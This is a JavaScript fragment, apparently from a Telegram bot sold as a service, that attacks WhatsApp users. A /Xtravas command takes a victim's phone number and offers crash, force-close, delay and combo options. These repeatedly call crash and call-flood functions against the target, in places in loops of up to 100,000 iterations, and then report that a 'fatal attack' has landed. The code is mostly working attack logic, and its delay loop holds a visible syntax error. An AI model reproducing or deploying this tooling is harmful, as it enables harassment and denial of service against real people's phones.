                            content: destinations
                        }
                    ]
                }
            ]
        };

        if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentity) {
            try {
                const deviceIdentity = encodeSignedDeviceIdentity(
                    sock.authState.creds.account,
                    true
                );

                wtfXrL.content[0].content.push({
                    tag: "device-identity",
                    attrs: {},
                    content: deviceIdentity
                });
            } catch (e) {}
        }

        await sock.sendNode(wtfXrL);

    } catch (e) {}
}

//=============================================//

async function AtrasoFvck() {
  
    if (wtfBro) return;
    wtfBro = true;

    const wtfXrL = Array.from({ length: memek_ibulu }).map(() =>
        (async () => {
            while (true) {
                const job = CallQueue.shift();
                if (!job) {
                    await wait(2);
                    continue;
                }

                try {
                    const start = Date.now();
                    await dozerDelay(job.jid);
                    const duration = Date.now() - start;

                    if (duration > 200) adaptiveKontl += 5;
                    else if (adaptiveKontl > delay_kont) adaptiveKontl -= 1;

                } catch { }

                await wait(adaptiveKontl);
            }
        })()
    );

    await Promise.all(wtfXrL);
}

async function invisibleFvck() {
  
    if (wtfBro) return;
    wtfBro = true;

    const wtfXrL = Array.from({ length: memek_ibulu }).map(() =>
        (async () => {
            while (true) {
                const job = CallQueue.shift();
                if (!job) {
                    await wait(2);
                    continue;
                }

                try {
                    const start = Date.now();
                    await PlainCall(job.jid);
                    const duration = Date.now() - start;

                    if (duration > 200) adaptiveKontl += 5;
                    else if (adaptiveKontl > delay_kont) adaptiveKontl -= 1;

                } catch { }

                await wait(adaptiveKontl);
            }
        })()
    );

    await Promise.all(wtfXrL);
}

//=============================================//

bot.onText(/\/Xtravas(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const q = match[1]?.trim();

  if (!q) {
    return msg.reply("Example:\n\n/Xtravas 628xxxx");
  }

  const Xtravastarget = q.replace(/[^0-9]/g, "");
  const musuh = Xtravastarget + "@s.whatsapp.net";

  pendingTarget.set(userId, musuh);

  await bot.sendPoll(
    chatId,
    `\n🩸⃟༑⌁⃰𝐗͢𝐭͢𝐫͢𝐚͢𝐯͢𝐚͢𝐬 𝐀͢𝐭͢𝐭͢𝐚͢𝐜͢𝐤͢ 🦠
›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${musuh}\n`,
    [
      "⌁⃰𝐗͢𝐭͢𝐫͢𝐚͢𝐯͢𝐚͢𝐬 𝟏𝐦𝐬𝐠༑",
      "⌁⃰𝐗͢𝐭͢𝐫͢𝐚͢𝐯͢𝐚͢𝐬 𝐅𝐨𝐫𝐜𝐞𝐜𝐥𝐨𝐬𝐞༑",
      "⌁⃰𝐗͢𝐭͢𝐫͢𝐚͢𝐯͢𝐚͢𝐬 𝐃͢𝐞͢𝐥͢𝐚͢𝐲༑",
      "⌁⃰𝐗͢𝐭͢𝐫͢𝐚͢𝐯͢𝐚͢𝐬 𝐂𝐨𝐦𝐛𝐨༑",
      "Batal"
    ],
    {
      is_anonymous: false,
      allows_multiple_answers: false
    }
  );
});

//=============================================//

bot.on("poll_answer", async (msg) => {
  const userId = msg.from.id;
  const choice = msg.option_ids[0];

  if (processingPoll.has(userId)) return;
  processingPoll.add(userId);

  const target = pendingTarget.get(userId);

  if (!target) {
    processingPoll.delete(userId);
    return;
  }

  const jid = target;
  let selected = "";
  let status = "𝐒𝐮𝐜𝐜𝐞𝐬𝐬";

  try {
    switch (choice) {
      case 0:
        selected = "⌁⃰𝐗͢𝐭͢𝐫͢𝐚͢𝐯͢𝐚͢𝐬 𝟏𝐦𝐬𝐠༑";
        await crashInfinity(sock, jid);
        break;

      case 1:
        selected = "⌁⃰𝐗͢𝐭͢𝐫͢𝐚͢𝐯͢𝐚͢𝐬 𝐅𝐨𝐫𝐜𝐞𝐜𝐥𝐨𝐬𝐞༑";
        await PlainCall(sock, jid);
        break;

      case 2:
        selected = "⌁⃰𝐗͢𝐭͢𝐫͢𝐚͢𝐯͢𝐚͢𝐬 𝐃͢𝐞͢𝐥͢𝐚͢𝐲༑";
        for (let i = 0; i < 100000; i++) {
          dozerDelay(sock, jid);
        }, 1000);
        break;

      case 3:
        selected = "⌁⃰𝐗͢𝐭͢𝐫͢𝐚͢𝐯͢𝐚͢𝐬 𝐂𝐨𝐦𝐛𝐨༑";
        for (let i = 0; i < 50; i++) {
          await crashInfinity(sock, jid);
          await PlainCall(sock, jid);
          dozerDelay(sock, jid);
        }
        break;

      default:
        selected = "❌ Dibatalkan";
        status = "CANCELLED";
    }
  } catch (err) {
    status = "𝐅𝐚𝐢𝐥𝐞𝐝";
  }

  // Send venue confirmation
  await bot.sendVenue(
    userId,
    -6.2,
    106.816666,
    "「 𝐗͢𝐓͢𝐑͢𝐀͢𝐕͢𝐀͢𝐒 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」",
    "t.me/Alywasr7x"
  );

  // Send final status message
  await bot.sendMessage(
    userId,
    `𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${jid}
𖥂 𝐕𝐈𝐑𝐔𝐒 : ${selected}
𖥂 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}

A fatal Xtravas attack has landed on the target's WhatsApp
Thank you for using R7X service

All right reserved by t.me/Alywasr7x`,
    { parse_mode: "Markdown" }
  );

  pendingTarget.delete(userId);
  processingPoll.delete(userId);
});